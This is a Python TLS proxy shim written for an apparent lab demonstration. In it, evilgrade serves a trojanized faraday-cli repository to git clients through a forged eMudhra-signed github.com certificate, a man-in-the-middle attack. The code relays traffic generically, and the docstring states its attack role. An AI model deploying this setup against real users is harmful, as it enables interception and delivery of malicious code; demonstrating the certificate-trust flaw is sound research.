#!/usr/bin/env python3
"""
tls_frontend.py - modern-TLS termination shim for the eMudhra git-clone demo.

Why this exists
---------------
evilgrade's Perl webserver terminates TLS via IO::Socket::SSL, which on macOS
is bound (through the system Perl's Net::SSLeay) to the OS LibreSSL (3.3.6).
That old stack fails to parse the ClientHello sent by a modern git/libcurl
(OpenSSL 3.5+), answering with a `decode_error` alert ("parse tlsext") before
any HTTP is exchanged -- so a current Homebrew git cannot complete the
handshake against evilgrade directly on this host.

This shim provides the ONE thing evilgrade can't here: a modern TLS endpoint.
It terminates TLS with a current OpenSSL (Homebrew python3, OpenSSL 3.5/4.x),
presenting the SAME forged eMudhra-signed github.com certificate, and forwards
the decrypted bytes to evilgrade's plain-HTTP port. evilgrade still does all
the real work -- vhost routing, the trojanized faraday-cli repo over dumb-HTTP.
The security-relevant fact under test is unchanged: the victim's git validates
the eMudhra cert against its CA store (the vulnerability) and clones our repo.

Against a REAL target (modern github.com) no shim is needed; this only works
around evilgrade's aged local TLS library.

Usage:
    python3 tls_frontend.py <listen_host:port> <backend_host:port> <cert.pem> <key.pem>
e.g.
    python3 tls_frontend.py 0.0.0.0:443 127.0.0.1:4444 \
        certs/emudhra_mitm/server.pem certs/emudhra_mitm/server.key
"""
import socket, ssl, sys, threading

def hostport(s, default_host="127.0.0.1"):
    if ":" in s:
        h, p = s.rsplit(":", 1)
        return (h or default_host), int(p)
    return default_host, int(s)

def pump(src, dst):
    try:
        while True:
            b = src.recv(65536)
            if not b:
                break
            dst.sendall(b)
    except OSError:
        pass
    finally:
        # Propagate EOF as a clean half-close (shutdown write only) rather than
        # tearing both directions down with SHUT_RDWR -- an abrupt reset makes a
        # modern TLS client report "unexpected eof while reading".
        try:
            dst.shutdown(socket.SHUT_WR)
        except OSError:
            pass

def handle(tls_conn, backend_addr):
    try:
        back = socket.create_connection(backend_addr, timeout=30)
    except OSError as e:
        try:
            tls_conn.close()
        except OSError:
            pass
        sys.stderr.write(f"[tls_frontend] backend connect failed: {e}\n")
        return
    t1 = threading.Thread(target=pump, args=(tls_conn, back), daemon=True)
    t2 = threading.Thread(target=pump, args=(back, tls_conn), daemon=True)
    t1.start(); t2.start(); t1.join(); t2.join()
    for s in (tls_conn, back):
        try:
            s.close()
        except OSError:
            pass

def main():
    if len(sys.argv) != 5:
        sys.exit(__doc__)
    listen_host, listen_port = hostport(sys.argv[1], "0.0.0.0")
    backend_addr = hostport(sys.argv[2])
    cert, key = sys.argv[3], sys.argv[4]

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=cert, keyfile=key)
    # Present the leaf + intermediate exactly as evilgrade would; let the
    # client decide trust against its own CA store (that's the point).

    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind((listen_host, listen_port))
    lsock.listen(64)
    print(f"[tls_frontend] TLS on {listen_host}:{listen_port} "
          f"-> {backend_addr[0]}:{backend_addr[1]} (cert={cert}, {ssl.OPENSSL_VERSION})",
          flush=True)

    while True:
        try:
            raw, peer = lsock.accept()
        except OSError:
            break
        try:
            tls = ctx.wrap_socket(raw, server_side=True)
        except (ssl.SSLError, OSError) as e:
            sys.stderr.write(f"[tls_frontend] handshake from {peer} failed: {e}\n")
            try:
                raw.close()
            except OSError:
                pass
            continue
        threading.Thread(target=handle, args=(tls, backend_addr), daemon=True).start()

if __name__ == "__main__":
    main()
